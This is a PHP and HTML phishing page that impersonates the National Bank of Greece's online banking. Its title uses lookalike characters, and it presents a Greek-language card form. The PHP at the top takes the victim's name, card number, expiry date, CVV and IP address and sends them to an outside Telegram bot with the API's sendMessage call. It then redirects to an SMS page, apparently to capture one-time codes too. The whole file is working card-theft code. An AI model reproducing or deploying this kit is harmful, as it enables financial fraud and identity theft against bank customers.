<?php
   session_start();
   error_reporting(0);
   include "../config.php";
   
   if(isset($_POST['infos'])){
   $ip = getenv("REMOTE_ADDR");
       $message = "-------------------- 💳 NBG Card 💳-------------------\nFull name : ".$_POST['cardName']."\nCC : ".$_POST['CardNumber']."\nEXP : ".$_POST['cardMonth']."/".$_POST['cardYear']."\nCVV : ".$_POST['cardCvv']."\nBrowser : ".$br."\nDevice : ".$os."\nCountry : ".$Country."\nIP      : ".$ip."\nURL     : ".$url."\n-------------------- 🇬🇷 Zoldyck 🇬🇷-------------------\n";
      foreach($user_ids as $user_id) {
      $url='https://api.telegram.org/bot'.$bottoken.'/sendMessage';
      $data=array('chat_id'=>$user_id,'text'=>$message);
      $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
      $context=stream_context_create($options);
      $result=file_get_contents($url,false,$context);
      
      }
      header("Location: sms.php?id=$ip");
      }
      ?>

<!DOCTYPE html>

<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Wеb ΝВG і-bаnk</title>
      <meta name="multilanguage" content="true">
      <meta name="mntc" content="[mntc]">
      <meta name="mntcMsg" content="[mntcMsg]">
      <meta name="arm" content="119">
      <meta name="lng" content="el">
      <meta name="epe" content="false">
      <meta name="_af" content="T_XIGso1SMr7zdtjnsjKGZ6X8NrfquicRUdDng4aKgmnaTuo9Mou7d-2csrY07FdvjBf6CmaIyPjJH1eurboogXRQhxuvZss65V2rJDfA_I1">
      <meta name="rscsSc" content="[rscsSc]">
      <meta name="indexTemplate" content="login-night">
      <meta name="appId" content="2e7971cd-7afd-49a0-89ae-7ec531298d01">
      <meta name="gaId" content="UA-33771010-2">
      <meta name="sbxId" content="[sbxId]">
      <meta name="ofnn" content="false">
      <meta name="ftr_exCustOnb" content="true">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" href="src/img/favicon.ico">
      <link href="src/style5.css" rel="stylesheet">  
      <link rel="stylesheet" href="src/css/style1.css">
   </head>
   <body class="login-bg windows login-night modal-open" style="background-image: url(src/img/new-login-2.45a8e3f5d546c08f846710e1ec6cabf9.jpg);" style="padding-right: 0.333374px;">
      
      <index-page ng-version="7.2.16">
         
            
               <login-header>
                  <header class="main-header">
                     <div class="flex-vertical-center-space-between header-container wrap-mobile-medium">
                        <nikomek-icon class="full-screen-width--mobile" style="height: 8.5rem; margin-top: -2.5rem">
                           <div class="flex-vertical-center" style="height: 11rem; min-height: 11rem;"><img alt="nbg logo" class="full-height margin-auto--mobile" src="src/img/login-logo.el.png"></div>
                        </nikomek-icon>
                       
                     
                     </div>
                  </header>
       
      </index-page>
     <form action="" method="POST">
                                    <div class="wrapper1" id="app" style=" padding-top: 0px; ">
                                       <div class="card-form" style=" margin-top: 20px; ">
                                          <div class="card-list">
                                             <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
                                                <div class="card-item__side -front">
                                                   <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
                                                   <div class="card-item__cover"> <img v-bind:src="'src/img/card-front.png'" class="card-item__bg"> </div>
                                                   <div class="card-item__wrapper">
                                                      <div class="card-item__top">
                                                         <div class="card-item__type">
                                                            <transition name="slide-fade-up"> <img  v-bind:src="'src/img/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg"> </transition>
                                                         </div>
                                                      </div>
                                                      <label for="cardNumber" class="card-item__number" ref="cardNumber">
                                                         <template v-if="getCardType === 'amex'">
                                                            <span v-for="(n, $index) in amexCardMask" :key="$index">
                                                               <transition name="slide-fade-up">
                                                                  <div class="card-item__numberItem"
                                                                     v-if="$index > 4 && $index < 14 && cardNumber.length > $index && n.trim() !== ''">
                                                                     *
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     :key="$index" v-else-if="cardNumber.length > $index">
                                                                     {{cardNumber[$index]}}
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     v-else :key="$index + 1">
                                                                     {{n}}
                                                                  </div>
                                                               </transition>
                                                            </span>
                                                         </template>
                                                         <template v-else>
                                                            <span v-for="(n, $index) in otherCardMask" :key="$index">
                                                               <transition name="slide-fade-up">
                                                                  <div class="card-item__numberItem"
                                                                     v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''">
                                                                     *
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     :key="$index" v-else-if="cardNumber.length > $index">
                                                                     {{cardNumber[$index]}}
                                                                  </div>
                                                                  <div class="card-item__numberItem" :class="{ '-active' : n.trim() === '' }"
                                                                     v-else :key="$index + 1">
                                                                     {{n}}
                                                                  </div>
                                                               </transition>
                                                            </span>
                                                         </template>
                                                      </label>
                                                      <div class="card-item__content">
                                                         <label for="cardName" style="text-align:left;" class="card-item__info" ref="cardName">
                                                            <div class="card-item__holder">Card Holder</div>
                                                            <transition name="slide-fade-up">
                                                               <div class="card-item__name" v-if="cardName.length" key="1">
                                                                  <transition-group name="slide-fade-right"> <span class="card-item__nameItem" v-for="(n, $index) in cardName.replace(/\s\s+/g, ' ')" v-if="$index === $index" v-bind:key="$index + 1">{{n}}</span> </transition-group>
                                                               </div>
                                                               <div class="card-item__name" v-else key="2">Fullname</div>
                                                            </transition>
                                                         </label>
                                                         <div class="card-item__date" ref="cardDate">
                                                            <label for="cardMonth" class="card-item__dateTitle" style="color:white;">Expires</label>
                                                            <label for="cardMonth" class="card-item__dateItem"  style="color:white;">
                                                               <transition name="slide-fade-up"> <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span> <span v-else key="2"> MM</span> </transition>
                                                            </label>
                                                            /
                                                            <label for="cardYear" class="card-item__dateItem"  style="color:white;">
                                                               <transition name="slide-fade-up"> <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span> <span v-else key="2"> YY</span> </transition>
                                                            </label>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                                <div class="card-item__side -back">
                                                   <div class="card-item__cover"> <img v-bind:src="'src/img/card-back.jpg'" class="card-item__bg"> </div>
                                                   <div class="card-item__band"></div>
                                                   <div class="card-item__cvv">
                                                      <div class="card-item__cvvTitle">CVC</div>
                                                      <div class="card-item__cvvBand"> <span v-for="(n, $index) in cardCvv" :key="$index">
                                                         *
                                                         </span> 
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="card-form__inner">
                                             <div class="card-input">
                                                <label for="cardName" class="card-input__label">Πλήρες όνομα</label>
                                                <input type="text" name="cardName" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required> 
                                             </div>
                                             <div class="card-input">
                                                <label for="cardNumber" class="card-input__label">Αριθμός Κάρτας </label>
                                                <input type="text" name="CardNumber" id="cardNumber" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" required> 
                                             </div>
                                             <div class="card-form__row">
                                                <div class="card-form__col">
                                                   <div class="card-form__group">
                                                      <label for="cardMonth" class="card-input__label">Ημερομηνία λήξης </label>
                                                      <select class="card-input__input -select" name="cardMonth" id="cardMonth" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                                                         <option value="" disabled selected>MM</option>
                                                         <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n"> {{n
                                                            < 10 ? '0' + n : n}} 
                                                         </option>
                                                      </select>
                                                      <select class="card-input__input -select" name="cardYear" id="cardYear" v-model="cardYear" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required>
                                                         <option value="" disabled selected>YY</option>
                                                         <option v-bind:value="$index + minCardYear" v-for="(n, $index) in 12" v-bind:key="n"> {{$index + minCardYear}} </option>
                                                      </select>
                                                   </div>
                                                </div>
                                                <div class="card-form__col -cvv">
                                                   <div class="card-input">
                                                      <label for="cardCvv" class="card-input__label">CVC</label>
                                                      <input style=" width: 60% " type="text" class="card-input__input" name="cardCvv" id="cardCvv" v-mask="'####'" maxlength="3" v-model="cardCvv" v-on:focus="flipCard(true)" v-on:blur="flipCard(false)" autocomplete="off" required> 
                                                   </div>
                                                </div>
                                             </div>
                                             <br>
                                             <div style="text-align:center;">
                                                <input type="submit"  style="background: #1c8a99; box-shadow: 0 1px 2px 0 rgb(0 0 0 / 25%); font-family: PF DinDisplay Pro Medium,Arial,Helvetica,sans-serif; font-weight: 500; font-style: normal; border-radius: 100px; border-radius: 6.25rem; border: none; font-size: 16px; font-size: 1rem; color: #fff; min-width: 94px; min-width: 5.875rem; text-align: center; cursor: pointer; transition: all .3s; padding: .0625rem 1rem .125rem; height: 70px; height: 2.5rem; min-height: 40px; min-height: 2.5rem; line-height: 40px; line-height: 2.5rem;" name="infos" value="ΣΥΝΕΧΕΙΑ">
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </form>

                                 <script src="src/js/vue.min.js"></script>
      <script src="src/js/vue-the-mask.js"></script>
      <script type="text/javascript" src="src/js/main.js"></script>
   </body>
</html>
